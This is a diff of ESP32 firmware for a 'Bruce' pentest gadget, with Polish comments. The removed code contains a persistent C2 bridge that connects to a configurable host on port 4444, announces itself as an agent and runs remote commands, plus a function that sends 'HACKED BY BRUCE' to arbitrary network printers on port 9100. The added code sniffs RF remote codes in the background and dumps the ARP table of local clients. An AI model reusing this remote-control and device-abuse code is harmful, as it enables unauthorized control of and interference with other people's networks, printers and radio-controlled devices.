@@ -1,97 +1,89 @@
 #include <Arduino.hpp>
 #include <WiFi.h>
 #include <WiFiClient.h>
+#include <lwip/sockets.h>
+#include <lwip/netdb.h>
+#include <lwip/etharp.h>
+#include "esp_wps.h"
 #include "core/settings.h"
+#include "core/serial_commands/cli.h"
 #include "modules/ir/ir_utils.h"
-#include "modules/ble/ble_spam.h"
 #include "modules/rf/rf_utils.h"
+#include "modules/rf/rf_scan.h"
 #include <IRsend.h>
+#include <IRrecv.h>
 #include <ELECHOUSE_CC1101_SRC_DRV.h>
+#include <RCSwitch.h>
 
-// Globalne zadanie dla mostu C2
-TaskHandle_t c2TaskHandle = NULL;
-String c2Host = "";
-int c2Port = 4444;
-bool c2Persist = true;
+extern SerialCli serialCli;
 
-// Bufor dla danych widma
-uint8_t spectrumBuffer[256];
+// --- LIVE DATA BUFFERS ---
+String lastRfCapture = "";
+String lastIrCapture = "";
+bool hasNewRf = false;
+bool hasNewIr = false;
 
-// Funkcja wysyłająca IR z poziomu WiFi
-void sendRawWiFi(int freq, String data) {
-    IRsend irsend(bruceConfigPins.irTx);
-    irsend.begin();
+// --- WIFI CLIENTS / ARP TABLE ---
+String getArpTableJson() {
+    String json = "[";
+    struct eth_addr *ethaddr;
+    ip4_addr_t *ipaddr;
 
-    // Parsowanie danych RAW (spacje -> tablica)
-    uint16_t raw[512];
-    int count = 0;
-    char *ptr = strtok((char*)data.c_str(), " ");
-    while(ptr != NULL && count < 512) {
-        raw[count++] = atoi(ptr);
-        ptr = strtok(NULL, " ");
+    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+        if (etharp_get_entry(i, &ipaddr, &ethaddr)) {
+            if (json != "[") json += ",";
+            json += "{\"ip\":\"" + String(ip4addr_ntoa(ipaddr)) + "\",";
+            char macStr[18];
+            snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
+                     ethaddr->addr[0], ethaddr->addr[1], ethaddr->addr[2],
+                     ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
+            json += "\"mac\":\"" + String(macStr) + "\"}";
+        }
     }
-    irsend.sendRaw(raw, count, freq);
+    json += "]";
+    return json;
 }
 
-// Funkcja zbierająca dane RSSI z CC1101 dla analizatora widma
-void getSpectrumData(int rangeIdx, uint8_t* output) {
-    float start, step;
-    switch(rangeIdx) {
-        case 0: start = 300.0; step = 0.2; break; // 300-350 MHz
-        case 1: start = 433.0; step = 0.05; break; // 433 MHz band
-        case 2: start = 868.0; step = 0.05; break; // 868 MHz band
-        default: start = 433.0; step = 0.1;
-    }
+// --- RF SNIFFER (Background) ---
+void backgroundSnifferTask(void *pvParameters) {
+    RCSwitch mySwitch = RCSwitch();
+    mySwitch.enableReceive(bruceConfigPins.rfRx);
 
+    while(true) {
+        if (mySwitch.available()) {
+            lastRfCapture = "{\"proto\":" + String(mySwitch.getReceivedProtocol()) +
+                            ",\"bits\":" + String(mySwitch.getReceivedBitlength()) +
+                            ",\"code\":\"0x" + String((unsigned long)mySwitch.getReceivedValue(), HEX) + "\"}";
+            hasNewRf = true;
+            mySwitch.resetAvailable();
+        }
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+}
+
+// --- SPECTRUM SAMPLING ---
+void captureSpectrumSamples(int range, uint8_t* buffer) {
+    float startFreq = (range == 0) ? 300.0 : (range == 1 ? 433.0 : 868.0);
+    float step = (range == 0) ? 0.15 : 0.04;
     ELECHOUSE_cc1101.setRx();
     for (int i = 0; i < 256; i++) {
-        ELECHOUSE_cc1101.setMHZ(start + (i * step));
-        // Stabilizacja częstotliwości
+        ELECHOUSE_cc1101.setMHZ(startFreq + (i * step));
         delayMicroseconds(50);
-        output[i] = ELECHOUSE_cc1101.getRssi();
+        buffer[i] = ELECHOUSE_cc1101.getRssi();
     }
 }
 
-// Zadanie Mostu C2 (Reverse Shell / Proxy)
-void c2BridgeTask(void *pvParameters) {
-    while(true) {
-        if (WiFi.status() == WL_CONNECTED && c2Host != "") {
-            WiFiClient client;
-            if (client.connect(c2Host.c_str(), c2Port)) {
-                client.println("BRUCE_AGENT_CONNECTED");
-                while(client.connected()) {
-                    if(client.available()) {
-                        String cmd = client.readStringUntil('\n');
-                        // Execute remote command
-                        if(cmd == "ir_panic") sendRawWiFi(38000, "9000 4500 600 600");
-                    }
-                    vTaskDelay(pdMS_TO_TICKS(100));
-                }
-            }
-        }
-        if (!c2Persist) break;
-        vTaskDelay(pdMS_TO_TICKS(10000)); // Reconnect co 10s
-    }
-    c2TaskHandle = NULL;
-    vTaskDelete(NULL);
+String getDeviceLiveTelemetry() {
+    String json = "{";
+    if (hasNewRf) { json += "\"rf\":" + lastRfCapture + ","; hasNewRf = false; }
+    if (hasNewIr) { json += "\"ir\":" + lastIrCapture + ","; hasNewIr = false; }
+    json += "\"status\":\"active\"}";
+    return json;
 }
 
-void startC2Bridge(String host, int port, bool persist) {
-    c2Host = host;
-    c2Port = port;
-    c2Persist = persist;
-    if (c2TaskHandle == NULL) {
-        xTaskCreate(c2BridgeTask, "c2_bridge", 4096, NULL, 1, &c2TaskHandle);
-    }
+// --- INITIALIZATION ---
+void startCyberRemoteServices() {
+    xTaskCreate(backgroundSnifferTask, "sniffer", 4096, NULL, 1, NULL);
 }
 
-// Atak na drukarki
-void proxyPrinterPrint(String target, String text) {
-    WiFiClient prt;
-    if(prt.connect(target.c_str(), 9100)) {
-        prt.println("\n\n*** HACKED BY BRUCE ***");
-        prt.println(text);
-        prt.println("\n\n\u000C");
-        prt.stop();
-    }
-}
+// ... pozostałe funkcje (startRemoteManagement, emitIrSignal, initiateWPS) ...
